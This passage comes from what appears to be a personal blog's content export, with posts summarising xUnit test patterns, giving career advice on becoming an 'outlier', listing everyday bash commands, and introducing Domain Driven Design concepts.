tell which of several assertions within the same test method caused a test failure.\nCause: Eager Test\nA single test verifies too much functionality.\nCause: Missing Assertion Message\nSymptoms: A test fails. Upon examining the output of the Test Runner, we cannot determine exactly which assertion failed.\nErratic Test One or more tests behave erratically; sometimes they pass and sometimes they fail.\nCause: Interacting Tests\nTests depend on other tests in some way. Note that Interacting Test Suites and Lonely Test are specific variations of Interacting Tests.\nCause: Interacting Test Suites\nIn this special case of Interacting Tests, the tests are in different test suites.\nCause: Lonely Test\nA Lonely Test is a special case of Interacting Tests.\nIn this case, a test can be run as part of a suite but cannot be run by itself because it depends on something in a Shared Fixture that was created by another test or by suite-level fixture setup logic. We can address this problem by converting the test to use a Fresh Fixture or by adding Lazy Setup logic to the Lonely Test to allow it to run by itself.\nCause: Resource Leakage\nTests or the SUT consume finite resources.\nCause: Resource Optimism\nA test that depends on external resources has non deterministic results depending on when or where it is run.\nCause: Unrepeatable Test\nA test behaves differently the first time it is run compared with how it behaves on subsequent test runs. In effect, it is interacting with itself across test runs.\nCause: Test Run War\nTest failures occur at random when several people are running tests simultaneously.\nCause: Non deterministic Test\nTest failures occur at random, even when only a single Test Runner is running tests.\nFragile Test A test fails to compile or run when the SUT is changed in ways that do not affect the part the test is exercising.\nCause: Interface Sensitivity\nInterface Sensitivity occurs when a test fails to compile or run because some part of the interface of the SUT that the test uses has changed.\nCause: Behavior Sensitivity\nBehavior Sensitivity occurs when changes to the SUT cause other tests to fail.\nCause: Data Sensitivity\nData Sensitivity occurs when a test fails because the data being used to test the SUT has been modified. This sensitivity most commonly arises when the contents of the test database change.\nCause: Context Sensitivity\nContext Sensitivity occurs when a test fails because the state or behavior of the context in which the SUT executes has changed in some way.\nCause: Overspecified Software\nA test says too much about how the software should be structured or behave.\nThis form of Behavior Sensitivity is associated with the style of testing called Behavior Verification. It is characterized by extensive use of Mock Objects to build layer-crossing tests.\nThe main issue is that the tests describe how the software should do something, not what it should achieve. That is, the tests will pass only if the software is implemented in a particular way. This problem can be avoided by applying the principle Use the Front Door First whenever possible to avoid encoding too much knowledge about the implementation of the SUT into the tests.\nCause: Sensitive Equality\nObjects to be verified are converted to strings and compared with an expected string.\nThis is an example of Behavior Sensitivity in that the test is sensitive to behavior that it is not in the business of verifying. We could also think of it as a case of Interface Sensitivity where the semantics of the interface have changed. Either way, the problem arises from the way the test was coded; using the string representations of objects for verifying them against expected values is just asking for trouble.\nCause: Fragile Fixture\nWhen a Standard Fixture is modified to accommodate a new test, several other tests fail.\nThis is an alias for either Data Sensitivity or Context Sensitivity depending on the nature of the fixture in question.\nFrequent Debugging Manual debugging is required to determine the cause of most test failures.\nManual Intervention A test requires a person to perform some manual action each time it is run.\nCause: Manual Fixture Setup\nSymptoms: A person has to set up the test environment manually before the automated tests can be run.\nThis activity may take the form of configuring servers, starting server processes, or running scripts to set up a Prebuilt Fixture.\nCause: Manual Result Verification\nSymptoms: We can run the tests but they almost always pass—even when we know that the SUT is not returning the correct results.\nCause: Manual Event Injection Symptoms: A person must intervene during test execution to perform some manual action before the test can proceed.\nSlow Tests The tests take too long to run.\nCause: Slow Component Usage\nA component of the SUT has high latency.\nCause: General Fixture\nSymptoms: Tests are consistently slow because each test builds the same over-engineered fixture.\nCause: Asynchronous Test\nSymptoms: A few tests take inordinately long to run; those tests contain explicit delays.\nCause: Too Many Tests\nSymptoms: There are so many tests that they are bound to take a long time to run regardless of how fast they execute.\nBuggy Tests Bugs are regularly found in the automated tests.\nCause: Fragile Test\nCause: Obscure Test\nCause: Hard-to-Test Code\nDevelopers Not Writing Tests Developers aren’t writing automated tests.\nCause: Not Enough Time\nDevelopers may have trouble writing tests in the time they are given to do the development.\nThis problem could be caused by an overly aggressive development schedule or supervisors/team leaders who instruct developers, “Don’t waste time writing tests.” Alternatively, developers may not have the skills needed to write tests efficiently and may not be allocated the time required to work their way up the learning curve.\nCause: Hard-to-Test Code\nCause: Wrong Test Automation Strategy\nAnother cause of Developers Not Writing Tests may be a test environment or test automation strategy that leads to Fragile Tests or Obscure Tests that take too long to write.\nWe need to ask the “five why’s” to find the root causes. Then we can address those causes and get the ship back on course.\nHigh Test Maintenance Cost Too much effort is spent maintaining existing tests.\nCause: Fragile Test\nCause: Obscure Test\nCause: Hard-to-Test Code\nProduction Bugs We find too many bugs during formal tests or in production.\nCause: Infrequently Run Tests\nSymptoms: We hear that our developers aren’t running the tests very often.\nWhen we ask some questions, we discover that running the tests takes too long (Slow Tests) or produces too many extraneous failures (Buggy Tests).\nCause: Lost Test\nSymptoms: The number of tests being executed in a test suite has declined (or has not increased as much as expected).\nWe may notice this directly if we are paying attention to test counts. Alternatively, we may find a bug that should have been caused by a test that we know exists but, upon poking around, we discover that the test has been disabled.\nCause: Missing Unit Test\nSymptoms: All the unit tests pass but a customer test continues to fail.\nAt some point, the customer test passed—but no unit tests were written to verify the behavior of the individual classes. Then, a subsequent code change modified the behavior of one of the classes, which broke its functionality.\nCause: Untested Code\nSymptoms: We may just “know” that some piece of code in the SUT is not being exercised by any tests.\nPerhaps we have never seen that code execute, or perhaps we used code coverage tools to prove this fact beyond a doubt.\nCause: Untested Requirement\nSymptoms: We may just “know” that some piece of functionality is not being tested.\nAlternatively, we may be trying to test a piece of software but cannot see any visible functionality that can be tested via the public interface of the software. All the tests we have written pass, however.\nCause: Neverfail Test\nSymptoms: We may just “know” that some piece of functionality is not working, even though the tests for that functionality pass.\nWhen doing test-driven development, we have added a test for functionality we have not yet written but we cannot get the test to fail.\nPatterns Recorded Test How do we prepare automated tests for our software?\nWe automate tests by recording interactions with the application and playing them back using a test tool.\nMost Recorded Test tools interact with the SUT through the user interface. Once an application is up and running and we don’t expect a lot of changes to it, we can use Recorded Tests to do regression testing. If we want to use the Tests as Documentation or if we want to use the tests to drive new development, we should consider using Scripted Tests. These goals are difficult to address with commercial Recorded Test tools because most do not let us define a Higher-Level Language for the test recording. This issue can be addressed by building the Recorded Test capability into the application itself or by using Refactored Recorded Test.\nScripted Test How do we prepare automated tests for our software?\nWe automate the tests by writing test programs by hand.\nScripted Tests allow us to prepare our tests before the software is developed so they can help drive the design. Unlike Recorded Tests, these tests can be either customer tests or unit tests. These test programs are often called “test scripts” to distinguish them from the production code they test. An opensource framework for defining Data-Driven Tests is Fit and its wiki-based cousin, FitNesse. Canoo WebTest is another tool that supports this style of testing.\nIn case of an existing legacy application, we can consider using Recorded Tests as a way of quickly creating a suite of regression tests that will protect us while we refactor the code to introduce testability. We can then prepare Scripted Tests for our now testable application.\nData-Driven Test How do we prepare automated tests for our software? How do we reduce Test Code Duplication?\nWe store all the information needed for each test in a data file and write an interpreter that reads the file and executes the tests.\nA Data-Driven Test is an ideal strategy for getting business people involved in writing automated tests. By keeping the format of the data file simple, we make it possible for the business person to populate the file with data and execute the tests without having to ask a technical person to write test code for each test. In general, xUnit is a more appropriate framework for unit testing than Fit; the reverse is true for customer tests.\nTest Automation Framework How do we make it easy to write and run tests written by different people?\nWe use a framework that provides all the mechanisms needed to run the test logic so the test writer needs to provide only the test-specific logic. They can be classified into two main categories: “robot user” test tools and Scripted Tests. The latter category can be further subdivided into the xUnit and Data-Driven Tests families of Test Automation Frameworks.\nMinimal Fixture Which fixture strategy should we use?\nWe use the smallest and simplest fixture possible for each test.\nStandard Fixture Which fixture strategy should we use?\nWe reuse the design of the text fixture across the many tests.\nA Standard Fixture is more about attitude than about technology. It requires us to decide early on in the testing process that we will design a Standard Fixture that can be used by several or many tests rather than mining a common fixture from tests that were designed independently.\nFresh Fixture Which fixture strategy should we use?\nEach test constructs its own brand-new test fixture for its own private use.\nVariation: Transient Fresh Fixture\nIf we need to refer to the fixture from several places in the test, we should use only local variables or instance variables to refer to the fixture.\nIn most cases we can depend on Garbage-Collected Teardown to destroy the fixture without any effort on our part.\nVariation: Persistent Fresh Fixture\nIf we do end up using a Persistent Fresh Fixture, either we need to tear down the fixture or we need to take special measures to avoid the need for its teardown.\nWe can tear down the fixture using In-line Teardown, Implicit Teardown, Delegated Teardown (see In-line Teardown), or Automated Teardown to leave the test environment in the same state as when we entered it.\nShared Fixture How can we avoid Slow Tests?\nWhich fixture strategy should we use?\nWe reuse the same instance of the test fixture across many tests.\nVariation: Immutable Shared Fixture\nThe problem with Shared Fixtures is that they lead to Erratic Tests if tests modify the Shared Fixture.\nShared Fixtures violate the Independent Test principle. We can avoid this problem by making the Shared Fixture immutable; that is, we partition the fixture needed by tests into two logical parts.\nThe first part is the stuff every test needs to have present but is never modified by any tests—that is, the Immutable Shared Fixture. The second part is the objects that any test needs to modify or delete; these objects should be built by each test as Fresh Fixtures. Shared Fixture Setup:\nPrebuilt Fixture Lazy Setup Setup Decorator Suite Fixture Setup Chained Tests A useful trick for keeping our fixture from becoming persistent during data access layer testing is to use Transaction Rollback Teardown.\nTo do so, we rely on the Humble Transaction Controller pattern when constructing our data access layer. That is, the code that reads or writes the database should never commit a transaction; this allows the code to be exercised by a test that rolls back the transaction to prevent any of the changes made by the SUT from being applied.\nBack Door Manipulation How can we verify logic independently when we cannot use a round-trip test?\nWe set up the test fixture or verify the outcome by going through a back door (such as direct database access).\nLayer Test How can we verify logic independently when it is part of a layered architecture?\nWe write separate tests for each layer of the layered architecture.\nTest Method Where do we put our test code?\nWe encode each test as a single Test Method on some class.\nFour-Phase Test How do we structure our test logic to make what we are testing obvious?\nWe structure each test with four distinct parts executed in sequence: fixture setup, exercise SUT, result verification, and fixture teardown.\nAssertion Method How do we make tests self-checking?\nWe call a utility method to evaluate whether an expected outcome has been achieved.\nSingle-Outcome Assertions such as fail; these take no arguments because they always behave the same way. Stated Outcome Assertions such as assertNotNull(anObjectReference) and assertTrue(aBooleanExpression); these compare a single argument to an outcome implied by the method name. Expected Exception Assertions such as assert_raises(expectedError) { codeToExecute }; these evaluate a block of code and a single expected exception argument. Equality Assertions such as assertEqual(expected, actual); these compare two objects or values for equality. Fuzzy Equality Assertions such as assertEqual(expected, actual, tolerance); these determine whether two values are “close enough” to each other by using a “tolerance” or “comparison mask.” Assertion Message How do we structure our test logic to know which assertion failed?\nWe include a descriptive string argument in each call to an Assertion Method.\nTestcase Class Where do we put our test code?\nWe group a set of related Test Methods on a single Testcase Class.\nTest Runner How do we run the tests?\nWe define an application that instantiates a Test Suite Object and executes all the Testcase Objects it contains.\nTestcase Object How do we run the tests?\nWe create a Command object for each test and call the run method when we wish to execute it.\nTest Suite Object How do we run the tests when we have many tests to run?\nWe define a collection class that implements the standard test interface and use it to run a set of related Testcase Objects.\nTest Discovery How does the Test Runner know which tests to run?\nThe Test Automation Framework discovers all tests that belong to the test suite automatically.\nTest Enumeration How does the Test Runner know which tests to run?\nThe test automater manually writes the code that enumerates all tests that belong to the test suite.\nTest Selection How does the Test Runner know which tests to run?\nThe Test Automation Framework selects the Test Methods to be run at runtime based on attributes of the tests.\nIn-line Setup How do we construct the Fresh Fixture?\nEach Test Method creates its own Fresh Fixture by calling the appropriate constructor methods to build exactly the test fixture it requires.\nDelegated Setup How do we construct the Fresh Fixture?\nEach Test Method creates its own Fresh Fixture by calling Creation Methods from within the Test Methods.\nCreation Method How do we construct the Fresh Fixture?\nWe set up the test fixture by calling methods that hide the mechanics of building ready-to-use objects behind Intent-Revealing Names.\nImplicit Setup How do we construct the Fresh Fixture?\nWe build the test fixture common to several tests in the setUp method.\nPrebuilt Fixture How do we cause the Shared Fixture to be built before the first test method that needs it?\nWe build the Shared Fixture separately from running the tests.\nLazy Setup How do we cause the Shared Fixture to be built before the first test method that needs it?\nWe use Lazy Initialization of the fixture to create it in the first test that needs it.\nSuite Fixture Setup How do we cause the Shared Fixture to be built before the first test method that needs it?\nWe build/destroy the shared fixture in special methods called by the Test Automation Framework before/after the first/last Test Method is called.\nSetup Decorator How do we cause the Shared Fixture to be built before the first test method that needs it?\nWe wrap the test suite with a Decorator that sets up the shared test fixture before running the tests and tears it down after all tests are done.\nChained Tests How do we cause the Shared Fixture to be built before the first test method that needs it?\nWe let the other tests in a test suite set up the test fixture.\nState Verification How do we make tests self-checking when there is state to be verified?\nWe inspect the state of the system under test after it has been exercised and compare it to the expected state.\nBehavior Verification How do we make tests self-checking when there is no state to verify?\nWe capture the indirect outputs of the SUT as they occur and compare them to the expected behavior.\nCustom Assertion How do we make tests self-checking when we have test-specific equality logic?\nHow do we reduce Test Code Duplication when the same assertion logic appears in many tests?\nHow do we avoid Conditional Test Logic?\nWe create a purpose-built Assertion Method that compares only those attributes of the object that define test-specific equality.\nDelta Assertion How do we make tests self-checking when we cannot control the initial contents of the fixture?\nWe specify assertions based on differences between the pre- and post-exercise state of the SUT.\nGuard Assertion How do we avoid Conditional Test Logic?\nWe replace an if statement in a test with an assertion that fails the test if not satisfied.\nUnfinished Test Assertion How do we structure our test logic to avoid leaving tests unfinished?\nWe ensure that incomplete tests fail by executing an assertion that is guaranteed to fail.\nGarbage-Collected Teardown How do we tear down the Test Fixture?\nWe let the garbage collection mechanism provided by the programming language clean up after our test.\nAutomated Teardown How do we tear down the Test Fixture?\nWe keep track of all resources that are created in a test and automatically destroy/free them during teardown.\nIn-line Teardown How do we tear down the Test Fixture?\nWe include teardown logic at the end of the Test Method immediately after the result verification.\nImplicit Teardown How do we tear down the Test Fixture?\nThe Test Automation Framework calls our cleanup logic in the tearDown method after every Test Method.\nTest Double Test Doubles to test indirect inputs and outputs\nHow can we verify logic independently when code it depends on is unusable? How can we avoid Slow Tests?\nWe replace a component on which the SUT depends with a “test-specific equivalent.”\nVariation: Test Stub\nWe use a Test Stub to replace a real component on which the SUT depends so that the test has a control point for the indirect inputs of the SUT.\nIts inclusion allows the test to force the SUT down paths it might not otherwise execute. We can further classify Test Stubs by the kind of indirect inputs they are used to inject into the SUT. A Responder (see Test Stub) injects valid values, while a Saboteur (see Test Stub) injects errors or exceptions\nVariation: Test Spy\nWe can use a more capable version of a Test Stub, the Test Spy, as an observation point for the indirect outputs of the SUT.\nLike a Test Stub, a Test Spy may need to provide values to the SUT in response to method calls. The Test Spy, however, also captures the indirect outputs of the SUT as it is exercised and saves them for later verification by the test. Thus, in many ways, the Test Spy is “just a” Test Stub with some recording capability. While a Test Spy is used for the same fundamental purpose as a Mock Object, the style of test we write using a Test Spy looks much more like a test written with a Test Stub.\nVariation: Mock Object\nWe can use a Mock Object as an observation point to verify the indirect outputs of the SUT as it is exercised.\nTypically, the Mock Object also includes the functionality of a Test Stub in that it must return values to the SUT if it hasn’t already failed the tests but the emphasisis on the verification of the indirect outputs. Therefore, a Mock Object is a lot more than just a Test Stub plus assertions: It is used in a fundamentally different way.\nVariation: Fake Object\nWe use a Fake Object to replace the functionality of a real DOC (Dependent-on Component) in a test for reasons other than verification of indirect inputs and outputs of the SUT.\nTypically, a Fake Object implements the same functionality as the real DOC but in a much simpler way. While a Fake Object is typically built specifically for testing, the test does not use it as either a control point or an observation point.\nVariation: Dummy Object\nSome method signatures of the SUT may require objects as parameters.\nIf neither the test nor the SUT cares about these objects, we may choose to pass in a Dummy Object, which may be as simple as a null object reference, an instance of the Object class, or an instance of a Pseudo-Object. In this sense, a Dummy Object isn’t really a Test Double per se but rather an alternative to the value patterns Literal Value, Derived Value, and Generated Value.\nVariation: Procedural Test Stub\nA Test Double implemented in a procedural programming language is often called a “test stub,” but I prefer to call it a Procedural Test Stub (see Test Stub) to distinguish this usage from the modern Test Stub variation of Test Doubles.\nTypically, we use a Procedural Test Stub to allow testing/debugging to proceed while waiting for other code to become available. It is rare for these objects to be “swapped in” at runtime but sometimes we make the code conditional on a “Debugging” flag—a form of Test Logic in Production.\nTest Stub How can we verify logic independently when it depends on indirect inputs from other software components?\nWe replace a real object with a test-specific object that feeds the desired indirect inputs into the system under test.\nTest Spy How do we implement Behavior Verification? How can we verify logic independently when it has indirect outputs to other software components?\nWe use a Test Double to capture the indirect output calls made to another component by the SUT for later verification by the test.\nMock Object How do we implement Behavior Verification for indirect outputs of the SUT? How can we verify logic independently when it depends on indirect inputs from other software components?\nWe replace an object on which the SUT depends on with a test-specific object that verifies it is being used correctly by the SUT.\nFake Object How can we verify logic independently when depended-on objects cannot be used? How can we avoid Slow Tests?\nWe replace a component that the SUT depends on with a much lighter-weight implementation.\nConfigurable Test Double How do we tell a Test Double what to return or expect?\nWe configure a reusable Test Double with the values to be returned or verified during the fixture setup phase of a test.\nHard-Coded Test Double How do we tell a Test Double what to return or expect?\nWe build the Test Double by hard-coding the return values and/or expected calls.\nTest-Specific Subclass How can we make code testable when we need to access private state of the SUT?\nWe add methods that expose the state or behavior needed by the test to a subclass of the SUT.\nNamed Test Suite How do we run the tests when we have arbitrary groups of tests to run?\nWe define a test suite, suitably named, that contains a set of tests that we wish to be able to run as a group. Example: smoke test\nTest Utility Method How do we reduce Test Code Duplication?\nWe encapsulate the test logic we want to reuse behind a suitably named utility method.\nParameterized Test How do we reduce Test Code Duplication when the same test logic appears in many tests?\nWe pass the information needed to do fixture setup and result verification to a utility method that implements the entire test life cycle.\nTestcase Class per Class How do we organize our Test Methods onto Testcase Classes?\nWe put all the Test Methods for one SUT class onto a single Testcase Class.\nTestcase Class per Feature How do we organize our Test Methods onto Testcase Classes?\nWe group the Test Methods onto Testcase Classes based on which testable feature of the SUT they exercise.\nTestcase Superclass Where do we put our test code when it is in reusable Test Utility Methods?\nWe inherit reusable test-specific logic from an abstract Testcase Super class.\nTest Helper Where do we put our test code when it is in reusable Test Utility Methods?\nWe define a helper class to hold any Test Utility Methods we want to reuse in several tests.\nDatabase Sandbox How do we develop and test software that depends on a database?\nWe provide a separate test database for each developer or tester.\nUnfortunately, a database is a primary cause of Erratic Tests due to the fact that data may persist between tests. A Database Sandbox is one way to keep the tests from interacting by accidentally accessing the same records in the database.\nWhen there is any way to test without a database, test without the database!\nWhat kinds of database tests will we require? The answer to this question depends on how our application uses the database.\nIf we have stored procedures, we should write unit tests to verify their logic. If a data access layer hides the database from the business logic, we should write tests for the data access functionality. Another way to tear down any changes made to the database during the fixture setup and exercise SUT phases of the test is Table Truncation Teardown. This “brute force” technique for deleting data works only when each developer has his or her own Database Sandbox and we want to clear out all the data in one or more tables.\nStored Procedure Test How can we verify logic independently when we have stored procedures?\nWe write Fully Automated Tests for each stored procedure.\nTable Truncation Teardown How do we tear down the Test Fixture when it is in a relational database?\nWe truncate the tables modified during the test to tear down the fixture. Variation: Lazy Teardown =\u0026gt; We simply issue the table truncation commands during fixture setup before setting up the new fixture.\nTransaction Rollback Teardown How do we tear down the Test Fixture when it is in a relational database?\nWe roll back the uncommitted test transaction as part of the teardown.\nDependency Injection How do we design the SUT so that we can replace its dependencies at runtime?\nThe client provides the depended-on object to the SUT.\nThe use of Singletons can be avoided through the use of an IOC tool or a manually coded Dependency Injection mechanism.\nConstructor Injection Parameter Injection Object Factory Service Locator Dependency Lookup How do we design the SUT so that we can replace its dependencies at runtime?\nThe SUT asks another object to return the depended-on object before it uses it.\nHumble Object How can we make code testable when it is too closely coupled to its environment?\nWe extract the logic into a separate, easy-to-test component that is decoupled from its environment.\nTest Hook How do we design the SUT so that we can replace its dependencies at runtime?\nWe modify the SUT to behave differently during the test.\nLiteral Value How do we specify the values to be used in tests?\nWe use literal constants for object attributes and assertions.\nBigDecimal expectedTotal = new BigDecimal(\u0026quot;99.95\u0026quot;);\nDerived Value How do we specify the values to be used in tests?\nWe use expressions to calculate values that can be derived from other values.\nBigDecimal expectedTotal = itemPrice.multiply(QUANTITY);\nGenerated Value How do we specify the values to be used in tests?\nWe generate a suitable value each time the test is run.\nBigDecimal uniqueCustomerNumber = getUniqueNumber();\nDummy Object How do we specify the values to be used in tests when the only usage is as irrelevant arguments of SUT method calls?\nWe pass an object that has no implementation as an argument of a method called on the SUT.\nInvoice inv = new Invoice( new DummyCustomer() );\nSummary You can find all the information from the following url:\nhttp://xunitpatterns.com/index.html\nWritten by Binwei@Oslo\n","link":"http://localhost:1313/post/2017/xunit_test_patterns/","section":"post","tags":["booknotes","architecture"],"title":"Xunit Test Patterns"},{"body":"How to Become an Outlier Published: Aug 20, 2017 Tags: career Category: Management\nDo you want to be an outlier? How do you measure success? Money? Friends and Family? Recognition? Fame? Making a difference? Does your definition of success drive the direction of your career? ... Or is it the other way around?\nTable of Contents If you want to be an outlier, you may be out of place, have to compromise on some areas in your life and people may see you as weirdo.\nThis is the price you need to pay\nThen you have to ask yourself what is the reason you want to be an outlier?\nOkay, if you still want to become an Outlier, there are three practices:\nNot enough time to learn and practice =\u0026gt; Command your time People don't respect the skills we have =\u0026gt; Hack your image We let chance dictate the trajectory of our careers =\u0026gt; Own your trajectory Command Your Time If you love life, don't waste time, for time is what life is made up of -- Bruce Lee\nThe amount of success you have in life is roughly equivalent to the amount of time you spend doing things people want.\nPractice What is Deliberate Practice?\nIt's not:\nStaying in your comfort zone Mindless repetition Watching others It's this:\nDoing things you're not good at Striving to improve Evaluating your performance Habits build experts, do commitment to something e.g. stand half of your day then become an habit\nYou do something all day long, don't you? The only difference is that you do a great many things and I do one -- Thomas Edison\nCut the noise Development is just like sleep. If you are interrupted a lot and it will take a lot of time to go back to zone again.\nThe less news you consume, the bigger the advantage you have. The problem is the news bring limited value to your life\nDelegate the work can let you have more time to focus on more rewarding things to you. Automate the trivial tasks like billing payment stuff\nYour biggest enemies are your bills. The cheaper you can live, the greater your options. -- Mark Cuban\nHack Your Image In order to do the big things, you have to let the small bad things happen -- Tim Ferriss\nPerception is Reality\nPick two from the following items:\nBe easy to work with Do great work Deliver on time It is difficult to make yourself good at everything, and make everyone happy. You have to make tough decision. Of course to keep a good balance can be an good option for you.\nSelf image === greatest constraint\nAre you selling yourself short?\nIt's not who we are that keeps us from where we want to be - it's who we THINK we are. -- Lisa Sayers\nIt will be explained in future blog about branding and communication.\nYou will always be limited due to your position and authority. To be constructive and realistic, try to maximize the impact and focus what you can do.\nOwn Your Trajectory Find a job to learn rather only to earn money\nValue of Learning\nIncreased income New job opportunities Reputation Opportunity to travel Just for fun It is up to you to decide which of these you value most!\nSpread your investment: Learn more skills\nYou can do the same thing as CEO and government leader, predict the trend, make scenarios and plan for actions\nMake long term strategic decision: Ask questions about what you don't want before what you want. Facing customers directly rather than always programming. Selling, presentation, marketing? Should I do this? =\u0026gt; If I do not do this, will I regret it? Written by Binwei@Gdynia\n","link":"http://localhost:1313/post/2017/become_outlier/","section":"post","tags":["career"],"title":"How to Become an Outlier"},{"body":"Bash: Useful Commands Published: Aug 19, 2017\nTags: shell\nCategory: ComputerScience\nBash is a widely shell, which is the default shell in many operating systems, e.g. Unix, Linux, Mac OS. Bash can help you achieve a lot. To invest time to learn some useful commands in bash is a good idea.\nTable of Contents Directory commands Home directory Handle space List files Others Wildcard Brace Expansion File Manipulation Input/Output redirection cp Modify file Search file View help and file content Process Other tips Commands parameters Avoid keeping sudo Shortcut keys Alias Others Directory commands Home directory For every user, there is a home directory which is presented by ~\ncd will go to home directory\nHandle space There are two ways to handle space in the path:\n1cd \u0026#39;My Documents\u0026#39; 2 3cd My\\ Documents List files ls -R: will show directory recursively\n*file **: can show files with format\nOthers pwd : show the working directory\nrm -rf [directory]: remove a not empty directory\nWildcard Bash supports wild card to match files.\n1* Matches anything, including nothing at all\n1? Matches exactly 1 character\n1[acd7_] Matches one of the characters in the list, above example would match a, c, d, 7 or _\nAnother example is: [^ax2] matches anything but a, x, 2\nYou can also use ranges, e.g. [a-z], [0-9], [A-C3-5]\nBrace Expansion Brace expansion is another handy way for you to write compact commands.\n1touch {a,b,c}.txt =\u0026gt; touch a.txt b.txt c.txt 2 3mv file.{txt,jpg} dir/ =\u0026gt; mv file.txt file.jpg dir 4 5touch {a..c}{1..3}.txt =\u0026gt; touch a1.txt a2.txt ... c2.txt c3.txt 6 7mv *{txt,jpg} Documents =\u0026gt; mv *txt *jpg Documents File Manipulation Input/Output redirection Output redirection is very important tool, which has two modes:\n1\u0026gt; will overwrite 2\u0026gt;\u0026gt; will append \u0026lt; is input redirect\ncp cp is the copy file command.\ncp -R will copy files recursively\nModify file Touch will create a empty file or update access time on an existing file\nsort command can sort the content in the file.\n1sort -nk2 [filename]*: can sort the content of file according to the second column tr can replace character\n1tr \u0026#39;Hello\u0026#39; \u0026#39;hello\u0026#39; \u0026lt; test \u0026gt; test2 cut: cut out selected positions of each line of a file\n1cut -c2 test =\u0026gt; cut the second character of each line in test file paste: get content from various files and put into one file\n1paste test test2 join: do the similar thing like paste but get rid of the header for each row\nSearch file grep command will do the search and list all the relevant lines\n1grep -nr security . =\u0026gt; search keyword security in current folder find can use pattern to find files\n1find . -name \u0026#34;*.rst\u0026#34; =\u0026gt; find all rst files under current folder wc: count lines, words and characters in a file\nuniq: do not show duplicated items\nhead and tail: show the beginning and end of the file\nView help and file content Use man to see the help manual\n1Space: down the page 2B: up the page 3/: search. N, n to go to next/previous match 4Q: exit Use less command to view a file, use the same keys like man\nProcess If you start a long process by a normal way, the terminal will be blocked.\nCtrl + Z will pause the process. fg will bring back the process. bg will let the process run in the background When you start a long program, you can also ends up a \u0026amp;, which means run in background\njobs: see the process in background\nkill can kill a process. e.g. kill %1\nps -e: list processes\nThe difference between jobs and ps is jobs only list the process managed by the shell.\nOther tips Commands parameters The command option can be combined in one dash\n1For example: ls -l -a 2Can be: ls -la Avoid keeping sudo In some operating system, if your account is not admin you will be asked to type sudo often. It is inconvenient.\nsudo -s: can avoid typing sudo every time\nShortcut keys Ctrl-a: Start of line Ctrl-e: End of line Ctrl-Left: Forward 1 word Ctrl_Right: Back 1 word Alt-D: Delete a word Alt-Backspace: Delete a word backward Ctrl-K: Delete rest of line Ctrl-U: Delete from start of line Ctrl-R: Search back in history Alias alias to show the alias\nalias v=gvim\n\\ls will use the original commands and ignore the alias\nOthers Select the text and click mid mouse button will do the copy/paste the selected text in terminal\nssh allows you to login the another system\nvar1='hello'\necho $var1\nWritten by Binwei@Oslo\n","link":"http://localhost:1313/post/2017/bash_useful_commands/","section":"post","tags":["shell"],"title":"Bash: Useful Commands"},{"body":"","link":"http://localhost:1313/tags/shell/","section":"tags","tags":null,"title":"Shell"},{"body":"Domain Driven Design: Introduction Published: Jun 19, 2017 Tags: architecture, process Category: ComputerScience\nDomain Driven Design (DDD) is about trying to make your software a model of a real-world system or process. The philosophy of DDD is about placing our attention at the heart of the application, focusing on the complexity that is intrinsic to the business domain itself. In using DDD, you are meant to work closely with a domain expert who can explain how the real-world system works. It also acts as the conceptual foundation for the design of the software itself - how it's broken down into objects or functions. In this blog post, I will cover the key elements of DDD.\nTable of Contents Concepts Domain Domain: a sphere of knowledge or activity\nProblem domain: the specific problem the software you're working on is trying to solve.\nCore domain: the key differentiator for the customer's business something they must do well and cannot outsource.\nWe distinguish the core domain (unique to the business) from the supporting sub-domains (typically generic in nature, such as money or time), and place appropriately more of our design efforts on the core.\nModel With DDD we’re looking to create models of a problem domain.\nA system of abstractions that describes selected aspects of a domain and can be used to solve problems related to that domain.\nContext Context: The setting in which a word or statement appears that determines its meaning.\nStatements about a model can only be understood in a context.\nWhenever we discuss a model it’s always within some context. This context can usually be inferred from the set of end-users that use the system.\nBounded Context In those younger days we were advised to build a unified model of the entire business, but DDD recognizes that we've learned that \u0026quot;total unification of the domain model for a large system will not be feasible or cost-effective\u0026quot;\nBounded Context: A description of a boundary (typically a subsystem, or the work of a specific team) within which a particular model is defined and applicable. Every domain model lives in precisely one BC, and a BC contains precisely one domain model. BC is a specific responsibility, with explicit boundaries that separate it from other parts of the system.\nExplicitly define the context within which a model applies…Keep the model strictly consistent within these bounds, but don't be distracted or confused by issues outside. --Eric Evans\nIf we know there are two BCs interacting with each other, then we know we must take care to translate between the concepts in one domain and those of the other.\nDifference between sub-domains \u0026amp; Bounded context:\nSub-domain is a problem space concept. Bounded context is a solution space concept. Ubiquitous language Used throughout that context from conversations to code\nUbiquitous language per bounded context\nFor example, in the e-commerce system, the term customer must have multiple meanings. When a user is browsing the catalog, customer means one thing, but when a user is placing an order, it means something else.\nPractices Context Mapping The process of identifying bounded contexts and their relationships to one another.\nDDD suggests that we draw up a context map to identify our BCs and those on which we depend or are depended, identifying the nature of these dependencies\nAll this talk about context maps and BCs is sometimes called strategic DDD.\nAfter all, figuring out the relationship between BCs is all pretty political when you think about it:\nwhich upstream systems will my system depend on, is it easy for me to integrate with them, do I have leverage over them, do I trust them? And the same holds true downstream:\nwhich systems will be using my services, how do I expose my functionality as services, will they have leverage over me? Misunderstand this and your application could easily be a failure.\nRelationship between BCs Published language: the interacting BCs agree on a common a language (for example a bunch of XML schemas over an enterprise service bus) by which they can interact with each other;\nOpen host service: a BC specifies a protocol (for example a RESTful web service) by which any other BC can use its services;\nShared kernel: two BCs use a common kernel of code (for example a library) as a common lingua-franca, but otherwise do their other stuff in their own specific way;\nCustomer/supplier: one BC uses the services of another and is a stakeholder (customer) of that other BC. As such it can influence the services provided by that BC;\nConformist: one BC uses the services of another but is not a stakeholder to that other BC. As such it uses \u0026quot;as-is\u0026quot; (conforms to) the protocols or APIs provided by that BC;\nAnti-corruption layer: one BC uses the services of another and is not a stakeholder, but aims to minimize impact from changes in the BC it depends on by introducing a set of adapters – an anti-corruption layer.\nAnemic and Rich Domain Models Anemic Domain Model: Model with classes focused on state management. Good for CRUD.\nRich Domain Model: Model with logic focused on behavior, not just state Preferred for DDD\nBuilding blocks Entity A mutable class with an identity (not tied to it's property values) used for tracking and persistence.\nValue Objects An immutable class whose identity is dependent on the combination of its value\nMeasures, quantifies, or describes a thing in the domain Identity is based on composition of values Immutable Compared using all values No side effects It may surprise you to learn that we should strive to model using Value Object instead of Entities wherever possible.\nValue Objects are a really good place to put methods and logic … a better place than entities. -- Eric Evans\nDomain Services Important operations that don't belong to a particular Entity or Value Object\nGood Domain Services:\nNot a nature part of an Entity or Value Object Have an interface defined in terms of other domain model elements Are stateless (but may have side 